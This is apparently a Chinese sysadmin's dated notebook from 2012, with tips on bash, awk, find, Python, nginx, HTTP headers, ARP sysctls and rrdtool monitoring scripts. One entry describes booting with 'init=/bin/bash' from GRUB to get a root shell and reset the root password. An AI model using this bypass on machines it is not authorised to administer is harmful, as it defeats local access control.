+腾讯的技术职业路径一共6级，从T1(工程师)到T6(首席科学家)，T4是一个中流砥柱般的存在，通常做过亿次级的用户量级才能当选，目前接近150人。一旦遇到重大的产品难题，由 T4组成的特别小组就会加入，他们亿次级用户量级的经验将发挥作用。
+获取字符串长度 ${#a}
+
+----------------------------------------2012.07.26----------------------------------
+  1 #!/bin/bash
+  2 echo $$
+  3 for ((i=0;i<100;i++))
+  4 do
+  5 {
+  6     sleep 5
+  7     echo  $$
+  8     exit 1
+  9 }&
+ 10 done
+ 11 wait
+shell 多线程
+
+python 编码转换  print a.decode('utf-8').encode('gbk')
+python 反转字符串 print a[::-1]
+python 字符串转整形 string.atoi("123")
+python 列表操作
+list.append() 追加 list.coutn(x) 列表中x出现的次数 list.extend(l) 追加列表l  list.index(x) x的位置 list.insert(2,"a") 在2插入a list.pop() 删除成员 按索引  list.remove() 按成员 list.reverse() 倒序 list.sort（）排序
+dic.clesr() 清空字典  dic.copy() 复制字典 dic.get(k) 获取看k 的值  dic.has_key(k) 是否包含键k  dic.keys（） 获取见的列表  dic.pop(k) 删除建k  dic.update（） 更新成员 dic.values() 获取键值列表 dic.items（） 由建和值组成的列表
+
+def abc（a=1，b=2） 调用 abc（None，3） 只给后一个传参
+def abc（*a） 可变长参数
+
+dir 可以获取模块定义的函数名称列表
+
+python中 以_开口头的 类成员是私有属性
+
+
+-------------------------------------------2012.07.27----------------------------------------
+ipvsadm -L -c  lvs 详细信息
+
+-------------------------------------------2012.07.31-----------------------------------------
+ mii-tool 查看网卡信息
+kudzu -p  查看硬件    /etc/sysconfig/hwconf
+/proc/pid/environ    是用null 来分割的 null  用tr "\000" "\n" 
+
+-------------------------------------------2012.08.01-------------------------------------
+usignet c语言 无符号数
+PRI的值越小，他的优先级越高，同理，由刚才公式，大家应该能想到NICE值越小 PRI优先级也就越高了。
+P（pri）=P(cpu)/2+P(user)+P(nice)+ZERO
+pri 与 top的 PR 不同 
+
+-------------------------------------------2012.08.02-----------------------------------
+find -printf "%f\n"  去路径
+maxdepath  find 深度
+
+你看，virt就是虚拟内存
+res就是驻留内存
+virt是你进程的虚拟空间实际分配了多少内存
+而res是你实际使用了多少物理内存
+一般拿来说，虚拟内存肯定比驻留内存大
+
+squid 缺点 用不了多核
+不支持视频拖拽
+单盘负载高
+小文件处理效率低下
+
+-------------------------------------------2012.08.03----------------------------------
+echo 3 > /proc/sys/vm/drop_caches 清理 cache
+ignore 1.无视；不理睬 2.不顾;不理;忽视 3.不管，忽略不计 Ignore 1.忽略 忽略 2.忽视 
+
+-------------------------------------------2012.08.07----------------------------------
+ie浏览器 url 长度限制 8192
+高性能运算 
+openmpi 
+torque
+xcat
+
+-------------------------------------------2012.08.08----------------------------------
+eval shell 赋值
+
+-------------------------------------------2012.08.09----------------------------------
+rmmod 删除某个模块
+/proc/net/  状态信息
+ip_vs
+ip_vs_app
+ip_vs_conn
+ip_vs_stats
+
+awk '{printf "%-3s\t%-4s\t\%-6s\t%-7s\n",$1,$2,$3,$4}' 1 awk 对其输出
+
+-------------------------------------------2012.08.10-------------------------------------------
+Python中的对象包含三要素：id、type、value
+is判断的是a对象是否就是b对象，是通过id来判断的
+==判断的是a对象的值是否和b对象的值相等，是通过value来判断的
+所以这个时候你要用的是==而不是is
+
+-------------------------------------------2012.08.13----------------------------
+ libvirt  linux 虚拟化接口
+
+-------------------------------------------2012.08.14--------------------------------
+最近发现find本身就是支持正则表达式的 
+find path -regex "xxx"
+find path -iregex "xxx"
+这两条命令都是运用base-regexp对文件路径进行匹配，iregex忽略大小写。
+但是给出的正则表达式必须要匹配完整的文件路径
+比如：find / -regex "find" 这样子是找不到/usr/bin/find的，要像这样find / -regex ".*find"或者更精确一点find / -regex ".*/find"
+如果要使用扩展的正则表达式，对于BSD系的find可以在路径名前加一个"-E"选项
+GNU的find支持多种风格的正则表达式，用-regextype 指定所使用的正则表达式类型，可选的有emacs(默认)，posix-awk，posix-basic，posix-egrep，posix-extended，喜欢了grep -E，所以我就用posix-egrep了
+
+find / -regextype "posix-egrep" -regex ".*/find"
+
+
+-------------------------------------------2012.08.15-------------------------------
+sar -n DEV 1 10 网卡事实流量 
+awk '{printf("%-10s\n",$1)}' 宽度10左对齐 awk '{printf("%10s\n",$1)}' 宽度10右对其   awk '{printf("%*s\n"，10,$1)}' 宽度10右对其   awk -F: '{a=15;printf( "%-*s| %*s|\n ",15,$1,20,$NF)}' 多参数对齐
+
+-------------------------------------------2012.08.16-------------------------------
+Referer	http://www.vegaga.com/  http请求头 页面来自哪个 请求
+awk  srand  简历 rand的新种子若木有种子，就是当天时间。
+只要发出递归查询，服务器必需回答目标IP与域名的映射关系。
+而迭代查询是，服务器收到一次迭代查询回复一次结果，这个结果不一定是目标IP与域名的映射关系，也可以是其它DNS服务器的地址。
+ 
+vegaga.com IN NS a.vegaga.com
+vegaga.com IN NS b.vegaga.com
+vegaga.com IN NS c.vegaga.com
+a.vegaga.com IN A  权威ip1
+b.vegaga.com IN A  权威ip2
+b.vegaga.com IN A  权威ip3
+
+--------------------------------------------2012.08.17---------------------------------
+#!/bin/sh                   
+IFS=:                       
+cat list.txt | while read user passwd;do
+echo "$user $passwd"        
+done  
+
+--------------------------------------------2012.08.20-----------------------------------
+arp_announce : INTEGER
+
+默认为0
+
+对网络接口上本地IP地址发出的ARP回应作出相应级别的限制:
+
+确定不同程度的限制,宣布对来自本地源IP地址发出Arp请求的接口
+
+0 - (默认) 在任意网络接口上的任何本地地址
+
+1 -尽量避免不在该网络接口子网段的本地地址. 当发起ARP请求的源IP地址是被设置应该经由路由达到此网络接口的时候很有用.此时会检查来访IP是否为所有接口上的子网段内ip之一.如果改来访IP不属于各个网络接口上的子网段内,那么将采用级别2的方式来进行处理.
+
+2 - 对查询目标使用最适当的本地地址.在此模式下将忽略这个IP数据包的源地址并尝试选择与能与该地址通信的本地地址.首要是选择所有的网络接口的子网中外出访问子网中包含该目标IP地址的本地地址. 如果没有合适的地址被发现,将选择当前的发送网络接口或其他的有可能接受到该ARP回应的网络接口来进行发送
+
+all/ 和{interface}/ 下两者同时比较，取较大一个值生效.
+
+提高约束级别有益于从指定的目标接受应答,而降低级别可以给予更多的arp查询者以反馈信息(关于arp代理这一段我普遍翻译地不好，去啃一下tcp/ip bible的卷一，然后再翻译吧)
+
+arp_ignore : INTEGER
+
+默认为0
+
+定义对目标地址为本地IP的ARP询问不同的应答模式
+
+0 - (默认值): 回应任何网络接口上对任何本地IP地址的arp查询请求（比如eth0=192.168.0.1/24,eth1=10.1.1.1/24,那么即使eth0收到来自10.1.1.2这样地址发起的对10.1.1.1 的arp查询也会回应--而原本这个请求该是出现在eth1上，也该有eth1回应的）
+
+1 - 只回答目标IP地址是来访网络接口本地地址的ARP查询请求（比如eth0=192.168.0.1/24,eth1=10.1.1.1/24,那么即使eth0收到来自10.1.1.2这样地址发起的对192.168.0.1的查询会回答，而对10.1.1.1 的arp查询不会回应）
+
+2 -只回答目标IP地址是来访网络接口本地地址的ARP查询请求,且来访IP必须在该网络接口的子网段内（比如eth0=192.168.0.1/24,eth1=10.1.1.1/24,eth1收到来自10.1.1.2这样地址发起的对192.168.0.1的查询不会回答，而对192.168.0.2发起的对192.168.0.1的arp查询会回应）
+
+3 - 不回应该网络界面的arp请求，而只对设置的唯一和连接地址做出回应(do not reply for local addresses configured with scope host,only resolutions for global and link addresses are replied 翻译地似乎不好，这个我的去问问人)
+
+4-7 - 保留未使用
+
+8 -不回应所有（本地地址）的arp查询
+
+all/ 和{interface}/ 下两者同时比较，取较大一个值生效.
+
+
+find -mmin +10  10 分钟前 修改的
+
+split -b 5m q q_block  把q文件分成 5m一个的小文件  q_blockaa q_blockab q_blockac q_blockad q_blockae q_blockaf q_blockag
+
+find ./ -name '*.bak' | xargs rm -rf
+一般情况，上面这个命令运行的很好，但是如果找到的文件名代空格上面的命令运行就可能会出问题了有一个参数-print0，于默认的-print相比，输出的序列不是以空格分隔，而是以null字符分隔。而xargs也有一个参数-0，可以接受以null而非空格间隔的输入流。所以说xargs简直就是为find而生的。上面的问题就很好解决了：
+find ./ -name '*.bak' -print0 | xargs -0 rm -rf
+
+dir 可以获取模块定义的函数名称列表 
+
+删除空目录
+find . -type d -empty |xargs rm -rf
+
+--------------------------------------------2012.08.23------------------------------------------------
+元字符
+.:匹配任意单个字符
+[]：指定范围内的任意单个字符
+[^]:不包括指定的字符
+*：匹配前面字符的任意次
+ 
+字符出现次数
+x\(m,n\)：出现x的次数范围为m-n
+x\(m,\)：出现x在m次以上
+x\(0,n\)：出现x最多n次
+ 
+锚定符：
+^：锚定行首
+$：锚定行尾
+\<,\b ：锚定词尾
+\>,\b：锚定词尾
+ 
+\(\)：分组    \1,\2：后向引用第几个分组
+ 
+几个范围的别名
+[:upper:] 所有大写字母
+[:lower:] 所有小写字母
+[:digit:] 所有数字
+[:alpha:] 所有字母
+[:alnum:] 数字和字母
+[:space:] 空白字符
+[:punct:] 符号
+ 
+ 选项：
+-v：对结果取反
+-i：忽略大小写
+-o：仅显示匹配到的字符串
+-E：支持扩展正则表达式
+-A n：after 匹配到所在行（含所在行）后的n行
+-B n：before 匹配到所在行（含所在行）前的n行
+-C n: 匹配到所在行（含所在行）上下的n行
+
+----------------------------------------2012.08.31---------------------------------
+mysqlbinlog查看二进制日志的问题
+
+在使用mysqlbinlog查看日志的时候碰到了一个问题， 
+错误提示如下：
+/usr/local/mysql/bin/mysqlbinlog: unknown variable 'default-character-set=utf8' 
+
+产生这个问题的原因是因为我在my.cnf中的client选项组中添加了
+default-character-set=utf8
+
+要解决这个bug的方法还是有的，  
+一种方法是使用：--no-defaults
+
+./mysqlbinlog --no-defaults mysql-bin.000063 
+
+fetch 取 chunked 块 （创科）
+
+mysql查询表结构 desc
+
+---------------------------------------2012.09.05--------------------------------
+compliant  兼容
+nginx 限制连接数
+ limit_conn one 20;          //连接数限制  
+ limit_rate 500k;            //带宽限制  
+
+---------------------------------------2012.09.11-------------------------------
+nginx alias无法在正则的location中使用。如果有这种需求，则必须使用rewrite和root。 
+
+---------------------------------------2012.09.14---------------------
+Vary:Accept-Encoding的用途  
+查看网页的response header一般都有Vary头（服务器支持压缩的都有），意思是说squid要把客户端传来的某个头区别对待，譬如Vary:Accept-Encoding，
+客户端发来Accept-Encoding:gzip（MSIE）, deflate时squid会为gzip, deflate做一个存档；如果客户端没发来Accept-Encoding这个头(wget)，squid又
+会为无Accept-Encoding做另一个存档；这两个存档的内容是不一样的，gzip, deflate的是压缩后的内容，一堆乱码，无Accept-Encoding的则是网页源码。
+知道了Vary的原理，剩下的事就容易了，在网页输出时加上Vary:User-Agent，意味着squid要为每一种User-Agent存一个存档，nginx里这样配置即可：
+add_header Vary Accept-Encoding;
+这时网页的response header会有Vary：
+Vary:Accept-Encoding;
+
+大多数的Unix系统中的负载只是记录那些处在运行状态和可运行状态的进程，但是Linux有所不同，它会包含那些不可中断的处于睡眠状态的进程。这时当这些进程由于I/O的阻塞而不能够运行，就可能显著的增加cpu的负载。所以在Unix和Linux下的cpu的负载的计算方法是不一样的，在设定监测值的时候也需要特别考率。
+ cpu的负载大概有个初步的了解，它跟cpu的利用率又有什么样的关系呢？cpu的利用率通常会把每个核上的占用率加起来，所以有时可能超过100%。cpu的负载和利用率之间没有必然的联系，有时会出现负载过高，但利用率不高的情况。例如，有大量的并发任务，但是每个任务的cpu占有率却很低，这时就会出现cpu负载过高利用率低下的问题。同样也会出现cpu的利用率很高，但cpu负载很低的现象。
+
+----------------------------------------2012.09.17----------------------------------
+
+http {
+: limit_zone   one  $binary_remote_addr  10m;
+
+: ...
+
+: server {
+
+: ...
+
+: location /download/ {
+: limit_conn   one  1;
+: }
+
+nginx 限制连接数
+
+---------------------------------------2012.09.18----------------------------
+mysql会给出我们最近执行的SQL命令和脚本；同linux command保存在~/.bash_history一样，你用mysql连接MySQL server的所有操作也会被记录到~/.mysql_history文件中，这样就会有很大的安全风险了，如添加MySQL用户的sql也同样会被明文记录到此文件中。
+
+---------------------------------------2012.09.26----------------------------
+Cache-Control : private
+Cache-Control : private = [field-name]
+表示对象（或指定字段）不能被保存在一个共享的缓存中同时是针对一个单独的用户的。它可以被保存在一个私有的缓存中。
+
+Cache-Control : no-cache
+Cache-Control : no-cache = [field-name]
+表示对象（或者指定字段）可以被缓存，但不能直接给客户除非经过原始服务器的重新验证。
+
+Cache-Control : no-store
+表示条目不能存储在持久的存储媒介中，同时应该尽可能快地从非未定存储媒介中删除。
+
+Cache-Control : no-transform
+代理可以将数据从一个存储系统中转换到另外一个。这个指令表示（大多数）响应不能被转换。（RFC允许某些字段的转换，即使存在这个头）
+
+Cache-Control : must-revalidate
+Cache-Control : proxy-revalidate
+强制代理重新验证该页面即使客户可以接受一个陈旧的响应。请在使用这些头之前阅读RFC，关于他们的使用有一些限制。
+
+警告
+    * HTTP/1.0有一个很小的缓存控制机制，仅能理解Pragma: no-cache头。使用HTTP/1.0的缓存将忽略Expires和Cache-Control头。
+
+    * 任何一个Cache-Control指令都不能保证隐私性或者数据的安全性。“private”和“no-store”指令可以为隐私性和安全性方面提供一些帮助，但是他们并不能用于替代身份验证和加密。
+
+
+-------------------------------------------2012.09.27----------------------------------
+Content[k?n?tent]  内涵
+
+-------------------------------------------2012.09.28---------------
+http header 跟随一个":"和域值构成。域名是大小写不敏感
+不同域名的头域被接收的顺序是不重要的。然而，首先发送常用头域，然后紧接着是请求头域
+或者是响应头域，然后是以实体头域结束，这样做是一个好的的方法。
+所有1XX（信息的），204（无内容的）和304（没有修改的）的响应都不能包括一个消息主体（message-body）。所有其他的响应必须包括消息主体，即使它长度可能为零.
+
+为了与HTTP/1.0应用程序兼容，包含HTTP/1.1消息主体的请求必须包括一个有效的内容长
+度（Content-Length）头域，除非服务器是HTTP/1.1遵循的。如果一个请求包含一个消息主体
+并且没有给出内容长度（Content-Length），那么服务器如果不能判断消息长度的话应该以
+400响应（错误的请求），或者以411响应（要求长度）如果它坚持想要收到一个有效内容长
+
+如果服务器能理解某方法但此方法对请求资源不被允许的，那么源服务器应该返回405状态码（方法不允许）；
+如果源服务器不能识别或没有实现某个方法，那么服务器应返回501状态码（没有实现）度（Content-length）。
+
+在uri http://www.w3.org/pub/www/TheProject.html 中 /pub/WWW/TheProject.html 为“abs_path” 绝对uri
+
+如果Request-URI是绝对地址（absoluteURI），那么主机（host）是Request-URI的一部分。任何出现在请求里Host头域的值应当被忽略。
+
+-------------------------------------------2012.09.29--------------------------------------------
+expires 一克斯拜尔斯 
+除非请求里Connection头域中包含“close”连接标记（connection-token），HTTP/1.1服务器
+总可以认为HTTP/1.1 客户端想要维持持久连接（persistent connection）。如果服务器想在发
+出响应后立即关闭连接，它应当发送一个含“close”的Connection头域。
+
+若客户端想要在发送请求消息主体之前等候100（继续）响应，则它必须发送一个Expect
+请求头域（见14.20节），并且值是“100-continue”。
+
+-------------------------------------------2012.10.08-----------------------------------------------------
+正则 只有两个基本操作，一个是回溯，一个是向右滑动
+回溯就是通过调整量词和分支什么的，使之能有一次匹配
+滑动就是在某个位置尝试所有的可能都不匹配后，从新位置重新尝试。
+205状态响应是服务器告诉用户代理应该重置引起请求被发送的文档视图。此响应主要的目的是清空文档视图表单里的输入框以便用户能输入其它信息。此响应不能包含一个实体。
+重新定向 3xx.
+这类状态码指明用户代理需要更进一步的动作去完成请求。进一步的动作可能被用户代理自动执行而不需要用户的交互，并且进一步动作请求的方法必须为GET或HEAD。一个客户端应该发现无限的重定向循环，因为此循环能产生网络拥挤。
+P53
+-------------------------------------------2012.10.09------------------------------------------------------
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(void)
+{
+	int i;
+	for(i=0;i<2;i++){
+		fork();
+		printf("-");
+	}
+	return  0;
+}
+打印几个 -？
+输出结果：--------
+解释：你知道printf有行缓冲吧？
+fork是简单的复制，会把所有内存信息复制过去
+所以第一题因为没有输出\n，所以会缓冲住，不会直接打印
+循环内部的代码执行两次
+第一次，fork变成两个进程
+然后两个进程都printf，但是并不打印，在缓冲区中
+然后分别fork，变成4个进程，并且都有printf
+
+res +n 调整vim 行高
+
+python 处理文本 simplejson 
+
+seq -w 01 99  
+
+-------------------------------2012.10.25-----------------------------
+用rrdtool画图后，其中的单位经常能让人看不明白，所以特定去cacti的官方网站，找到了如下资料：
+
+-18  a - atto
+-15  f - femto
+-12  p - pico
+-9   n - nano
+-6   μ - micro
+-3   m - milli
+0    (no unit)
+3    k - kilo
+6    M - mega
+9    G - giga
+12   T - tera
+15   P - peta
+18   E - exa
+ 查看系统版本
+
+curl -s -o /dev/null -w %{time_connect}:%{time_starttransfer}:%{time_total} http://www.baidu.com   
+0.331:0.495:0.678
+df -i来查看系统inode的使用情况
+readonly  用来标识一个变量或者函数为只读。
+export HISTTIMEFORMAT='%F %T '
+
+nagios 邮件超时  nagios.cfg,将notification_timeout=30 改大点
+
+------------------------------2012.10.29------------------------
+ftp://ftp.mozilla.org/pub/firefox/releases/ 火狐离线安装包
+
+------------------------------2012.11.02-------------------------
+分布式两种 一种是用算法算出映射关系  一种是用数据存数据的存储信息
+>>> import HTMLParser
+>>> HTMLParser.HTMLParser().unescape('That&#39;s Why (you Go Away)')
+u"That's Why (you Go Away)"
+>>> from web.net import htmlquote
+>>> htmlquote('That&#39;s Why (you Go Away)')
+u'That&amp;#39;s Why (you Go Away)'
+
+1、使用tar对文件压缩加密：
+# tar -zcvf - pma|openssl des3 -salt -k password | dd of=pma.des3
+完成将得到一个pma.des3的打包文件，用你设置的密码替换password。
+
+2、使用tar对加密文件解压：
+# dd if=pma.des3 |openssl des3 -d -k password|tar zxf -
+
+string.letters abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+string.digits 0123456789
+
+vim ? 向上搜索
+vim -x filename vim 加密文件
+:%s/<four>/4/g  只替换单词 four
+
+-------------------------------2012.11.05-------------------------
+当VIP的掩码设置成32位时，VIP只能被连接，不会主动去连接别的IP。这是由“路由表”决定的。
+for dev in /sys/class/net/*/device ; do awk -F/ '{print $5}' <<< ${dev} ; done
+---------------------------------2012.11.06---------------------
+file 查看文本字符集
+iconv -f gb2312 -t utf8 date.csv >new 字符集转换
+Linux 中的设备有2种类型：字符设备(无缓冲且只能顺序存取)、块设备(有缓冲且可以随机存取)。
+
+--------------------------------2012.11.07---------------------------
+export PROMPT_COMMAND="history -a"  history 实时记录
+linux unset 删除本脚本的 定义函数 变量等
+私钥必须是600权限，否则ssh服务器会拒绝用户登陆。
+strace -o st.log -e trace=all  cat first.sh 追踪某个程序的运行过程保存到 st.log  文件中 trace= 可以自定义 
+option=[!]all or option=[!]val1[,val2]...  options: trace, abbrev, verbose, raw, signal, read, or write
+interval  间隔 
+
+FusionChartsFree  作图软件
+
+---------------------------------2012.11.08--------------------------------
+matplotlib python 图表绘制系统
+TGFusionCharts   flash 图表
+ 使用Python绘制热图的库 pyHeatMap
+
+1、在Grub的引导装载程序菜单上，选择你要进入的条目，键入 “e” 来进入编辑模式。
+2、在第二行（类似于kernel /vmlinuz-2.6.15 ro root=/dev/hda2 ），键入”e”进入编辑模式；
+3、在句末加上”init=/bin/bash”，回车；
+4、按“b”启动系统。
+这样我们即可获得一个bash的shell。
+
+进入shell后，根分区的挂载模式默认是只读，我们要将其改为可写，否则不能更改root密码
+
+mount -no remount,rw /
+passwd root
+sync
+mount -no remount,ro /
+reboot
+
+python -c 'print reduce(lambda x,y: x*y, range(1,101))'  python 计算 1到100 阶乘
+Fabric python ssh 批量管理
+
+date +%T  H:M:S
+----------------------------------2012.11.09-------------------------------------
+lsattr 查看文件 chattr 属性
+shopt -q login_shell 判断是不是 登录shell
+http://www.observeit-sys.com/zh-CN/Products/Version_Selection 操作记录软件
+
+----------------------------------2012.11.13--------------------------------------
+declare -r 只读 -i 整数（可直接运算：a=2;a=a+2）-a 数组 -x 这样将声明一个变量作为脚本的环境变量而被导出。 
+declare命令允许在声明变量类型的时候同时给变量赋值
+在脚本中没有带任何参数的declare -f 会列出所有在此脚本前面已定义的函数出来，而declare -f function_name则只会列出指定的函数.
+cmp协议并不是就指的是ping，而是 ping是使用icmp协议中的一种（我们ping 出去发送的数据包icmp协议的类型为8 代码为0，在routeros
+中写为icmp-options=8：0；而我们对ping做出回应icmp类型为0 代码为0）
+
+shell 默认值 ${VAR:=”some default”} ${VAR2:=42} ${VAR3:=$LOGNAME}
+使用双引号除了变量名[2]前缀($)、后引符(`)和转义符(\)外，会使shell不再解释引号中其它所有的特殊字符
+{}  和()类似，也是将多个命令组合在一起。它们之间的区别是，()是在产生的子shell下执行，而{}是在当前的shell下执行。这与前面讲到是使用".  filename.sh"
+注意：()里面两边可以不使用空格，{}里面两边必须使用空格，且最后一个命令也需要以“；”结尾，表示命令结束。
+
+数字测试： -eq -ne -lt -le -gt -ge，[[ ]]同 [ ]一致
+文件测试： -r、-l、-w、-x、-f、-d、-s、-nt、-ot，[[ ]]同 [ ]一致
+字符串测试： > < =(同==) != -n -z，不可使用“<=”和“>=”，[[ ]]同 [ ]一致，但在[]中，>和<必须使用\进行转义，即\>和\<
+逻辑测试： []为 -a -o ! [[ ]] 为&& || !
+数学运算： [] 不可以使用 [[ ]]可以使用+ - */ %
+组合： 均可用各自逻辑符号连接的数字（运算）测试、文件测试、字符测试
+
+nginx nginx之geoip 根据ip的地区性控制
+
+python的twisted
+
+-----------------------------------2012.11.14--------------------------------------
+python -m timeit -s 'print 123' python脚本的执行速度测试
+rename ex a_20 ex*.log  将ex121105.log重命名a_20121105.log， * 所有 ？单个
+
+-----------------------------------2012.11.15------------------------------------
+树莓派 优盘电脑
+
+-----------------------------------2012.11.16--------------------------------------
+date -d "2003/08/15 12:00" +%s 某个时间的 秒值
+DS: mem  : GAUGE : 600  : 0      : 671744  
+  | 标示 | 类型  | 心跳 | 最小值 | 最大值
+
+-----------------------------------2012.11.20------------------------------------------
+#!/bin/bash
+BIN="/usr/bin/rrdtool"
+RRD="./test.rrd"
+
+if ! test -e $RRD ;then
+$BIN create  test.rrd -s 5 \
+DS:eth0:COUNTER:10:U:U \
+DS:cpu:GAUGE:10:U:U \
+DS:mem_total:GAUGE:10:U:U \
+DS:mem_free:GAUGE:10:U:U \
+DS:mem_buffer:GAUGE:10:U:U \
+DS:mem_cache:GAUGE:10:U:U \
+RRA:MAX:0.5:1:600 \
+RRA:MAX:0.5:5:600 \
+RRA:MAX:0.5:12:600 \
+RRA:AVERAGE:0.5:1:600 \
+RRA:AVERAGE:0.5:5:600 \
+RRA:AVERAGE:0.5:12:600
+fi
+
+while :
+do
+load=`awk '{print $1*100}' /proc/loadavg`
+eth0=`grep -oP eth0:[0-9]+ /proc/net/dev`
+mem_t=`awk '/MemTotal/{print $2}' /proc/meminfo`
+mem_f=`awk '/MemFree/{print $2}' /proc/meminfo`
+mem_b=`awk '/Buffers/{print $2}' /proc/meminfo`
+mem_c=`awk '/Cached/{print $2;exit}' /proc/meminfo`
+INFO=N:${eth0##*:}:$load:$mem_t:$mem_f:$mem_b:$mem_c
+#$BIN update $RRD $INFO
+echo $INFO
+echo $((i++))
+sleep 5
+done 
+
+
+
+rrdtool graph test.png \
+--start now-300 \
+DEF:load=test.rrd:cpu:MAX \
+DEF:eth0=test.rrd:eth0:AVERAGE \
+DEF:mem_t=test.rrd:mem_total:AVERAGE \
+DEF:mem_f=test.rrd:mem_free:AVERAGE \
+DEF:mem_b=test.rrd:mem_buffer:AVERAGE \
+DEF:mem_c=test.rrd:mem_cache:AVERAGE \
+CDEF:vload=load,1700,+ \
+CDEF:veth0=1200,eth0,5,/,+ \
+CDEF:vmem_t=mem_t,1024,/ \
+CDEF:vmem_f=mem_f,1024,/ \
+CDEF:vmem_b=mem_b,1024,/ \
+CDEF:vmem_c=mem_b,1024,/ \
+COMMENT:"          名称           最大值          平均值\n" \
+COMMENT:"      " \
+AREA:vmem_t#0000C6:"内存小  " \
+GPRINT:mem_t:MAX:"%12.0lf" \
+GPRINT:mem_t:AVERAGE:"%12.0lf\n" \
+COMMENT:"      " \
+AREA:vmem_f#00DB00:"空闲容量" \
+GPRINT:mem_f:MAX:"%12.0lf" \
+GPRINT:mem_f:AVERAGE:"%12.0lf\n" \
+COMMENT:"      " \
+STACK:vmem_b#9F35FF:"buffer " \
+GPRINT:mem_b:MAX:"%12.0lf" \
+GPRINT:mem_b:AVERAGE:"%12.0lf\n" \
+COMMENT:"      " \
+STACK:vmem_c#00E3E3:"cache  " \
+GPRINT:mem_c:MAX:"%12.0lf" \
+GPRINT:mem_c:AVERAGE:"%12.0lf\n" \
+COMMENT:"      " \
+LINE1:veth0#6F00D2:"eth0   " \
+GPRINT:eth0:MAX:"%12.0lf" \
+GPRINT:eth0:AVERAGE:"%12.0lf\n" \
+COMMENT:"      " \
+LINE1:vload#00DB00:"负载    " \
+GPRINT:load:MAX:"%12.0lf" \
+GPRINT:load:AVERAGE:"%12.0lf\n" \
+-t "系统监控" \
+-v "总表" \
+-h 250 -w 400 \
+--lower-limit 0  --upper-limit 2000 --rigid \
+-y 500:1
+
+[-s|--start seconds]：绘图起始时间，预设是一天前(-1d)，可用-s `date …`来指定时间
+[-e|--end time]：绘图结束时间, 预设是现在(now),除date 的应用外,可用 -e -1w 表示绘图的时间结束于一周前
+[-t|--title title]：图上显示的标题
+[-v|--vertical-label text]：Y轴上的说明文字
+[-w|--width pixels]：绘图区域，画图区宽的大小
+[-h|--height pixels]：绘图区域，画图区高的大小
+-u：Y轴正值高度
+-l：Y轴负值高度
+--no-minor 不要副格线
+--color CANVAS#ffffff
+--color BACK#ffffff \
+--color FONT#000000 \
+--color MGRID#80C080 \
+--color GRID#808020 \
+--color FRAME#808080 \
+--color ARROW#ff0000 \
+--color SHADEA#404040 \
+--color SHADEB#404040"
+
+类型（4种）： GAUGE | COUNTER | DERIVE | ABSOLUTE
+ 
+LINE:value2#ff0000:out:STACK 累加画图
+
+a=b;b=c; echo ${!a} 输出c 这时a的值b作为参数名
+
+-----------------------------------2012.11.21------------------------------------------
+python freeze 打包
+data=(`awk -F, '{print $1,$3;exit}' 1`)  shell 数组需要加括号
+
+-----------------------------------2012.11.22---------------------------------------
+ldd /bin/ls 查看某个执行文件的依赖库
+samples 样品取样
+代码大全  有时间了 可以看看
+你用gcc的话，希望代码只执行预处理，就用 gcc -E xx.c -o xx.i
+静坐常思己过，闲谈莫论人非。
+
+------------------------------------2012.11.23-------------------------------------
+Alpha，Beta，Gamma  α，β，γ
+seasonal period 季节期
+新版 rrdtool --grid-dash on:off 这只网格的类型，如  --grid-dash 1:3   点线  --grid-dash 1:0  实线 
+
+------------------------------------2012.11.24----------------------------------
+paste  -d ","  两个文件并列打印，分隔符为 ，
+python  修饰器  a.__name__ 打印参数函数名
+set命令的-e参数，linux自带的说明如下：
+"Exit immediately if a simple command exits with a non-zero status."
+也就是说，在"set -e"之后出现的代码，一旦出现了返回值非零，整个脚本就会立即退出。
+-o 参数 设置了这个选项以后，包含管道命令的语句的返回值，会变成最后一个返回非零的管道命令的返回值。
+linux正则 BREs、EREs、PREs
+BREs、EREs 不支持 \d 数字[0-9] \D 非数字 \s空白[\f\n\r\t\v]  \S 非空白 \t \v水平制表 \n \f换页 \r 回车 \cx  匹配由 x 指明的控制字符，例如：\cM匹配一个Control-M 或
+回车符，x 的值必须为A-Z 或 a-z 之一，否则，将 c 视为一个原义的 'c' 字符
+
+都支持 \w 匹配包括下划线的任何单词字符（等价于[A-Za-z0-9_]） \W 匹配任何非单词字符 (等价于[^A-Za-z0-9_]) 
+
+wmi python windows 模块
+redmine 项目管理工具
+------------------------------------2012.11.27-------------------------d----------
+/dev/sdb1 /dataext3 defaults,noatime,nodiratime 0 0
+getconf PAGESIZE 获取系统 块大小
+pcretest 正则表达式测试
+nginx autoindex 提供列表目录
+shell 偶数单引号可以打印变量
+python 多分隔符 re.split(r",|\||:", 'abcd,abcd|abcd:abcd')
+python交互乱码 yum -y install readine readline-devel 
+
+------------------------------------2012.11.28--------------------------------
+strip是trim掉字符串两边的空格。
+lstrip, trim掉左边的空格
+rstrip, trim掉右边的空格
+wget -q 下载木有标准输出
+python编译安装前  安装 yum install zlib zlib-devel readline readline-devel openssl-devel sqlite-devel
+damn small linux 小巧的linux
+qemu 开源虚拟器 可以在win上运行linux
+
+python 防止错误导入 
+try: from hashlib import md5
+except ImportError: from md5 import md5 
+
+a = iter('abc');a.next();a.next()  迭代器 遍历完 抛异常 StopIteration
+yield  生成器
+
+-------------------------------------2012.11.28----------------------
+python 判断 字符串开头结尾 startswith()和endswith() 
+ if isinstance(obj, int): 对象比较
+class SampleClass(object):
+
+web 返回图片
+class checkcode:
+    def GET(self):       
+        web.header("Content-Type",'image/gif')
+        return make_check_code_image()
+
+-------------------------------------2012.11.30------------------------
+当函数的参数不确定时，可以使用*args 和**kwargs，*args 没有key值，**kwargs有key值。
+grep -lr ‘string’ path/*
+例如：查找 home/web/www目录下的文件中包含 hello world 的字符串
+grep -lr ‘hello world’ /home/web/www
